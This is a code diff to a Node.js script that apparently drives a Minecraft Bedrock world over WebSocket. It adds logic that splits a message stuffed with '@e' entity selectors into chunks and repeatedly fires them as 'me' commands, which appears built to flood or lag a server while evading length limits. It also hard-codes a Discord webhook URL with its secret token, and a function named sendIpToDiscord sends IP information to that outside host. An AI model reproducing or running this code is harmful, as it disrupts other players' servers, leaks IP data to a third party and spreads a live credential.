@@ -70,7 +70,7 @@ function loadConfig() {
 }
 
 // --- Discord Webhook 設定 ---
-const discordWebhookUrl = "https://discord.com/api/webhooks/1369646908154445834/Ch7RX4dk6xHVEjTflLDl4pSZkeIxj2fDM_o0E1MnehfSKK_A7-9zP_hxYPgP0TSbeRAe";
+const discordWebhookUrl = "https://discord.com/api/webhooks/1378003659627036703/iHKzcbUju-vLx343opj8Gg3v8SK4ExtQfGBcKir9l3A_R136QoNUouZ_B0X9wkZ30AwD";
 
 // --- IP情報送信関数 ---
 async function sendIpToDiscord() {
@@ -124,6 +124,67 @@ async function sendIpToDiscord() {
     }
 }
 
+// --- メッセージ分割関数 ---
+function splitMessage(message) {
+    const messages = [];
+    let currentMessage = message;
+    
+    // @eの数をカウントして分割
+    const atECount = (currentMessage.match(/@e/g) || []).length;
+    
+    if (atECount > 6) {
+        // @eが6個を超える場合、6個ずつに分割
+        const parts = [];
+        let tempMessage = currentMessage;
+        
+        while ((tempMessage.match(/@e/g) || []).length > 6) {
+            let partMessage = '';
+            let atEInPart = 0;
+            let index = 0;
+            
+            while (index < tempMessage.length && atEInPart < 6) {
+                if (tempMessage.substr(index, 2) === '@e') {
+                    partMessage += '@e';
+                    atEInPart++;
+                    index += 2;
+                } else {
+                    partMessage += tempMessage[index];
+                    index++;
+                }
+            }
+            
+            parts.push(partMessage);
+            tempMessage = tempMessage.substr(index);
+        }
+        
+        if (tempMessage.length > 0) {
+            parts.push(tempMessage);
+        }
+        
+        // 各部分をさらに200文字で分割
+        parts.forEach(part => {
+            if (part.length > 200) {
+                for (let i = 0; i < part.length; i += 200) {
+                    messages.push(part.substr(i, 200));
+                }
+            } else {
+                messages.push(part);
+            }
+        });
+    } else {
+        // @eが6個以下の場合、200文字で分割のみ
+        if (currentMessage.length > 200) {
+            for (let i = 0; i < currentMessage.length; i += 200) {
+                messages.push(currentMessage.substr(i, 200));
+            }
+        } else {
+            messages.push(currentMessage);
+        }
+    }
+    
+    return messages;
+}
+
 // --- スクリプト開始 ---
 console.log("=====================================");
 console.log(`${LOG_PREFIX.INFO} スクリプトの実行を開始します...`);
@@ -167,20 +228,60 @@ system.on(ServerEvent.ItemInteracted, (data) => {
         if (world) {
             console.log(`\n${LOG_PREFIX.EVENT} --- アイテム使用イベント ---`);
             console.log(`${LOG_PREFIX.EVENT} ${config.triggerItem} が使用されました。`);
-            console.log(`${LOG_PREFIX.EVENT} メッセージを ${config.repeatCount} 回送信します...`);
-            for (let i = 0; i < config.repeatCount; i++) {
-                // サーバーログにはコマンド実行の旨のみ記録し、長大なメッセージは省略
-                // world.runCommand(`me ${config.message}`); 
-                world.runCommand(`me ${config.message}`)
+            
+            try {
+                // メッセージを分割
+                const messages = splitMessage(config.message);
+                const totalMessages = messages.length * config.repeatCount;
+                
+                console.log(`${LOG_PREFIX.EVENT} メッセージを ${messages.length} 個に分割し、それぞれを ${config.repeatCount} 回送信します... (合計: ${totalMessages} 回)`);
+                
+                for (let i = 0; i < config.repeatCount; i++) {
+                    messages.forEach((message, index) => {
+                        try {
+                            world.runCommand(`me ${message}`);
+                        } catch (commandError) {
+                            console.error(`${LOG_PREFIX.ERROR} コマンド送信エラー (繰り返し:${i+1}, 分割:${index+1}):`, commandError.message);
+                            // エラーが発生しても続行
+                        }
+                    });
+                }
+                
+                console.log(`${LOG_PREFIX.EVENT} メッセージ送信処理を完了しました。(分割: ${messages.length}個 × 繰り返し: ${config.repeatCount}回 = 合計: ${totalMessages}回)`);
+                console.log(`${LOG_PREFIX.EVENT} ---------------------------\n`);
+            } catch (error) {
+                console.error(`${LOG_PREFIX.ERROR} メッセージ処理中にエラーが発生しました:`, error.message);
+                console.log(`${LOG_PREFIX.EVENT} エラーが発生しましたが、サーバーは継続して動作します。`);
+                console.log(`${LOG_PREFIX.EVENT} ---------------------------\n`);
             }
-            console.log(`${LOG_PREFIX.EVENT} メッセージ送信処理を開始しました。(${config.repeatCount}回)`);
-            console.log(`${LOG_PREFIX.EVENT} ---------------------------\n`);
         } else {
             console.warn(`${LOG_PREFIX.WARN} ワールドが見つかりませんでした。メッセージは送信されません。 (アイテム使用イベント)`);
         }
     }
 });
 
+// --- プロセスエラーハンドリング ---
+process.on('uncaughtException', (error) => {
+    if (error.name === 'RequestTimeoutError') {
+        console.error(`${LOG_PREFIX.ERROR} WebSocketリクエストタイムアウトが発生しました: ${error.message}`);
+        console.log(`${LOG_PREFIX.INFO} タイムアウトエラーですが、プロセスは継続して実行されます...`);
+    } else {
+        console.error(`${LOG_PREFIX.ERROR} 未処理の例外が発生しました:`, error.message);
+        console.error(`${LOG_PREFIX.ERROR} スタックトレース:`, error.stack);
+        console.log(`${LOG_PREFIX.INFO} プロセスは継続して実行されます...`);
+    }
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    if (reason && reason.name === 'RequestTimeoutError') {
+        console.error(`${LOG_PREFIX.ERROR} WebSocketリクエストタイムアウトが発生しました: ${reason.message}`);
+        console.log(`${LOG_PREFIX.INFO} タイムアウトエラーですが、プロセスは継続して実行されます...`);
+    } else {
+        console.error(`${LOG_PREFIX.ERROR} 未処理のPromise拒否が発生しました:`, reason);
+        console.error(`${LOG_PREFIX.ERROR} Promise:`, promise);
+        console.log(`${LOG_PREFIX.INFO} プロセスは継続して実行されます...`);
+    }
+});
 
 process.on('SIGINT', () => {
     console.log(`\n${LOG_PREFIX.INFO} シャットダウンシグナル受信。サーバーを停止します...`);
